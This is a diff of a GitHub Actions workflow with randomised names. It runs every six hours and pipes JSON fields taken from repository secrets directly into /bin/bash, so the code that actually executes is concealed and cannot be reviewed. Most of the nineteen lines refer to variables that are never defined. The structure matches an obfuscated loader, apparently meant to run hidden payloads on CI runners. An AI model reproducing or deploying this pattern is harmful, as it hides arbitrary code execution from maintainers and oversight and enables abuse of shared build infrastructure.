@@ -2,8 +2,7 @@ name: rendageng7890
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 0/6 * * *'
-
+    - cron: '38 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +11,25 @@ jobs:
       - uses: actions/checkout@v4
       - name: rendageng7890
         env:
-          p14: ${{ secrets.p14 }}
+          yq6: ${{ secrets.yq6 }}
         run: |
-          echo $p14 | jq -r .d1939 | /bin/bash
-          echo $ye7 | jq -r .gq69 | /bin/bash
-          echo $od1226 | jq -r .lbosn26 | /bin/bash
-          echo $w0 | jq -r .bem2316 | /bin/bash
-          echo $zg51 | jq -r .c2415 | /bin/bash
-          echo $we984 | jq -r .f2 | /bin/bash
+          echo $yq6 | jq -r .y09096 | /bin/bash
+          echo $lu4106 | jq -r .zphii54 | /bin/bash
+          echo $cd4846 | jq -r .funr97945 | /bin/bash
+          echo $lg37 | jq -r .yq4370 | /bin/bash
+          echo $qgt12579 | jq -r .ub2 | /bin/bash
+          echo $hd52 | jq -r .pus7374 | /bin/bash
+          echo $jfxz62 | jq -r .hp26209 | /bin/bash
+          echo $zfs95 | jq -r .ms33 | /bin/bash
+          echo $rjf851 | jq -r .dqcsj06624 | /bin/bash
+          echo $hqm424 | jq -r .hn81 | /bin/bash
+          echo $tac91862 | jq -r .h309 | /bin/bash
+          echo $bxgx3060 | jq -r .bjs3433 | /bin/bash
+          echo $i128 | jq -r .rin01 | /bin/bash
+          echo $bao29040 | jq -r .g1572 | /bin/bash
+          echo $cwz3 | jq -r .uje11916 | /bin/bash
+          echo $rbrof30 | jq -r .hdwnf048 | /bin/bash
+          echo $zhdrx5966 | jq -r .ehgbr267 | /bin/bash
+          echo $idd10059 | jq -r .fqu281 | /bin/bash
+          echo $yk389 | jq -r .mca133 | /bin/bash
 
